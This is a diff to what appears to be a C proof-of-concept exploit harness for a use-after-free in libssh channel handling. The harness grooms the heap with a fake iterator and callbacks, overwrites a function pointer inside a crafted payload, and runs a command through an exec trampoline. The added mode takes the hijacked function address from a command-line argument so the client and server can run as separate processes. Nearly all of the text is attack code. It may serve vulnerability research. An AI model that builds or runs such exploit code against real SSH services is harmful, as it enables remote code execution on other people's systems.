@@ -41,6 +41,10 @@ static int g_nodetach = 0;
 static int g_no_reclaim = 0;
 static void *g_old_buf = NULL;
 static struct ssh_iterator *g_old_it = NULL;
+#ifdef W12_FIXEDADDR
+static int g_fixedaddr = 0;
+static uint64_t g_fixed_fn = 0;
+#endif
 static struct ssh_iterator g_fake_it;
 static struct ssh_channel_callbacks_struct g_fake_cbs;
 static int exec_trampoline(ssh_session s, ssh_channel ch, void *data,
@@ -369,13 +373,24 @@ static int run_client(void)
         memcpy(payload + 120, &want, sizeof(want));
         if (g_call) {
             uint64_t fn = g_bad_call ? 0x4141414141414141ull :
+#ifdef W12_FIXEDADDR
+                          (g_fixedaddr ? g_fixed_fn :
+                           (g_exec ? (uint64_t)(uintptr_t)&exec_trampoline :
+                            (uint64_t)(uintptr_t)&marker_data));
+#else
                           (g_exec ? (uint64_t)(uintptr_t)&exec_trampoline :
                            (uint64_t)(uintptr_t)&marker_data);
+#endif
             memcpy(payload + 112, &fn, sizeof(fn));
             if (g_exec) {
                 memcpy(payload, g_exec_cmd, sizeof(g_exec_cmd));
+#ifdef W12_FIXEDADDR
+                printf("CLIENT sent exec cmd=%s fn=0x%llx fixedaddr=%d\n",
+                       g_exec_cmd, (unsigned long long)fn, g_fixedaddr);
+#else
                 printf("CLIENT sent exec cmd=%s fn=0x%llx\n",
                        g_exec_cmd, (unsigned long long)fn);
+#endif
             } else {
                 printf("CLIENT sent call fn=0x%llx bad=%d\n",
                        (unsigned long long)fn, g_bad_call);
@@ -418,12 +433,45 @@ int main(int argc, char **argv)
     __asan_set_death_callback(asan_death);
     ssh_init();
     pid_t pid;
+#ifdef W12_FIXEDADDR
+    if (argc < 2 || argc > 4) {
+#else
     if (argc < 2 || argc > 3) {
+#endif
         fprintf(stderr,
+#ifdef W12_FIXEDADDR
+                "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-fixedaddr|client-only FN_ADDR|server-only|server-fixedaddr FN_ADDR]\n",
+#else
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare]\n",
+#endif
                 argv[0]);
         return 2;
     }
+#ifdef W12_FIXEDADDR
+    /* Separate-process replay: the address comes from an argument, never
+     * from a forked peer's image. */
+    if (argc == 3 && strcmp(argv[2], "server-only") == 0) {
+        return run_server(argv[1]);
+    }
+    if (argc == 4 && strcmp(argv[2], "client-only") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_fixedaddr = 1;
+        g_fixed_fn = strtoull(argv[3], NULL, 0);
+        return run_client();
+    }
+    if (argc == 4 && strcmp(argv[2], "server-fixedaddr") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_fixedaddr = 1;
+        g_fixed_fn = strtoull(argv[3], NULL, 0);
+        return run_server(argv[1]);
+    }
+#endif
     if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
         g_send_close = 0;
         g_free_on_data = 0;
@@ -459,6 +507,15 @@ int main(int argc, char **argv)
         g_nodetach = 1;
         g_no_reclaim = 1;
         g_exec = 1;
+#ifdef W12_FIXEDADDR
+    } else if (argc == 4 && strcmp(argv[2], "groom-fixedaddr") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_fixedaddr = 1;
+        g_fixed_fn = strtoull(argv[3], NULL, 0);
+#endif
     } else if (argc == 3) {
         fprintf(stderr, "unknown mode: %s\n", argv[2]);
         return 2;
